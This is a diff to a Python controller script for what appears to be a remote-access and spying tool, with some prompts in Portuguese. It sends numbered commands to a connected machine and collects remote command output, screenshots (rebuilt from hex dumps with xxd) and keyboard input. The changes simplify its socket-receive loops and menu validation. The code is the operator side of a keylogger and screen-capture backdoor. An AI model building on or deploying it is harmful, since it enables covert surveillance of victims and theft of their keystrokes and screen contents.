@@ -14,51 +14,24 @@ def command(conn):
         else:
             while True:
                 data = conn.recv(1024)
-                if not data:
-                    # If there is no data, the connection has been terminated
-                    print("Conexão encerrada pelo servidor.")
-                    break
-                elif data.decode('utf-8') == "END\n\x00":
+                if data.decode('utf-8') == "END\n\x00":
                     # Message ending
-                    print(received_msg)
-                    break
-                elif data.decode('utf-8').endswith("\x00END\n\x00"):
-                    # Message ending
-                    received_msg += data.decode('utf-8').rstrip('END\n\x00')
-                    # Displays the received message
-                    print(received_msg)
+                    print(received_msg.strip())
                     break
                 # Decodes the received message
-                received_msg += data.decode('utf-8').rstrip('\x00')
+                received_msg += data.decode('utf-8')
                 
-
 def screenshot(file):
-    received_msg = ""
     while True:
         data = conn.recv(1024)
-        if not data:
-            # If there is no data, the connection has been terminated
-            print("Conexão encerrada pelo servidor.")
+        if data.decode('utf-8') == "END\n\x00":
             break
-        elif data.decode('utf-8') == "END\n\x00":
-            # Message ending
-            break
-        elif data.decode('utf-8').endswith("\x00END\n\x00"):
-            # Message ending
-            received_msg += data.decode('utf-8').rstrip('\x00END\n\x00')
-            # Writes the received message
-            file.write(received_msg)
-            sleep(3)
-            break
-        # Decodes the received message
-        received_msg += data.decode('utf-8').rstrip('\x00')
+        # Writes the received message
+        file.write(data.rstrip(b'\x00'))
     print("Screenshot finalizado com sucesso.")
 
 def keyboard():
     data = conn.recv(1024)
-    if not data:
-        # If there is no data, the connection has been terminated
-        print("Não há input de teclado.")
     # Decodes and displays the received message
     received_msg = data.decode('utf-8').rstrip('\n\x00')
     print(received_msg)
@@ -95,7 +68,7 @@ while True:
 
     try:
         num = int(input())
-        if num != 1 and num != 2 and num != 3 and num != 4 and num != 5:
+        if num not in [1,2,3,4,5]:
             raise ValueError
     except ValueError:
         print("Invalid input. Please enter a valid integer.")
@@ -109,11 +82,11 @@ while True:
     # PPM screenshot (not compatible with graphic interfce)
     elif num == 2:
         file_path = "./temp.txt"
+        file = open(file_path, 'ab')
         screenshot_path = f"./screenshot{i}.ppm"
         i += 1
         cmd = "2\n"
         conn.sendall(cmd.encode('utf-8'))
-        file = open(file_path, 'a')
         screenshot(file)
         file.close()
         hexdump_command = "xxd -r -p " + file_path + " > " + screenshot_path
@@ -122,13 +95,13 @@ while True:
     # PNG screenshot
     elif num == 3:
         file_path = "./temp2.txt"
+        file = open(file_path, 'ab')
         screenshot_path = f"./screenshot{j}.png"
         j += 1
         cmd = "3\n"
         conn.sendall(cmd.encode('utf-8'))
         user = input("Escreva o nome do usuário normal: ")
         conn.sendall(user.encode('utf-8'))
-        file = open(file_path, 'a')
         screenshot(file)
         file.close()
         hexdump_command = "xxd -r -p " + file_path + " > " + screenshot_path
